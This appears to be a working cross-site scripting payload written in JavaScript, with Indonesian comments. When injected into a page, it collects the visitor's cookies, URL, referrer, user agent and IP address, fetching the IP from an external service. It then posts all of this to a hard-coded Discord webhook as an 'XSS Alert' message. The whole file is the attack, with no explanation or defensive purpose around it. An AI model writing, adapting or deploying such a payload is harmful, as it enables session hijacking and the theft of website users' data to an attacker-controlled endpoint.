(async () => {
  const info = {
    site: document.domain,
    url: location.href,
    cookie: document.cookie,
    userAgent: navigator.userAgent,
    referer: document.referrer,
    time: new Date().toLocaleString()
  };

  try {
    // Ambil IP korban
    const ipRes = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipRes.json();
    info.ip = ipData.ip;
  } catch (err) {
    info.ip = 'Gagal ambil IP';
  }

  const fullMessage = `✅ Berhasil konek ke website: ${document.domain}\n\n` +
                      `*XSS Alert di* ${document.domain}\n` +
                      `----------------------------\n\n` +
                      `🌐 URL Target:\n\`${location.hostname}${location.pathname}\`\n\n` +
                      `🍪 Document Cookie:\n${document.cookie}\n\n` +
                      `📄 Referer: ${document.referrer}\n` +
                      `📱 User Agent: ${navigator.userAgent}\n` +
                      `🌐 IP Address: ${info.ip}\n` +
                      `⏰ Time: ${info.time}`;

  fetch('https://discord.com/api/webhooks/1391022161015345222/HMB9H_1qG8R__WZZeqC1rTKzcMdLhuyCWZHMHVd0bnP8SfjIW905-CUvtTdIwJmqmJKY', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: fullMessage })
  });
})();
